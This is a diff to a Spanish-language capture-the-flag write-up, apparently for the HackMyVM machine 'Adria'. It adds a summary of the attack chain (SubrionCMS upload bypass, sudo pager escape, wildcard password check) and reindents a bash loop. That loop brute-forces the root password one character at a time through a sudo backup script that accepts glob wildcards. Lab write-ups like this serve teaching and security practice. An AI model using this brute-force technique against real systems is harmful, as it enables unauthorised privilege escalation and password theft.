@@ -5,6 +5,7 @@
  categories: [HackMyVM]
  tags: [SubrionCMS,Upload Bypass,Scripting, SMB]
  pin: true
+ description: "La máquina Adria fue comprometida vía una vulnerabilidad de carga de archivos en SubrionCMS, obteniendo una shell inicial como www-data. Luego, se escaló a adriana aprovechando un binario sudo que permitía ejecutar comandos en un contexto paginado. Finalmente, se obtuvo acceso a root explotando una debilidad en la validación de contraseñas de otro script sudo, que permitía el uso de comodines para una fuerza bruta caracter a caracter de la contraseña de root."
  image:
      path: /posts/2024-03-17-HVM-Adria/adria.png
 ---
@@ -134,13 +135,13 @@ Al parece se intenta usar rutas absolutas pero nada de eso sirve, ya que para co
 ```bash
 #este caso es verdadero
 if [[ "ho*" == "hola" ]];then
-	echo "algo"
+ echo "algo"
 fi
 
 # en cambio en el siguiente caso es un string literal y por lo tanto
 # es falso
 if [ "ho*" == "hola" ];then
-	echo "algo"
+ echo "algo"
 fi
 
 ```
@@ -157,15 +158,15 @@ pass=''
 
 while true;do
 
-	for i in "${!chars[@]}"
-	do
-		auth=$(echo "$pass${chars[$i]}*" | sudo /opt/backup 2>/dev/null| grep 'Authorized' && echo $pass)
-		if [ $? == 0 ];then
-			pass="$pass${chars[$i]}"
-			echo $pass
-			break
-		fi
-	done
+ for i in "${!chars[@]}"
+ do
+  auth=$(echo "$pass${chars[$i]}*" | sudo /opt/backup 2>/dev/null| grep 'Authorized' && echo $pass)
+  if [ $? == 0 ];then
+   pass="$pass${chars[$i]}"
+   echo $pass
+   break
+  fi
+ done
 done
 ```
 
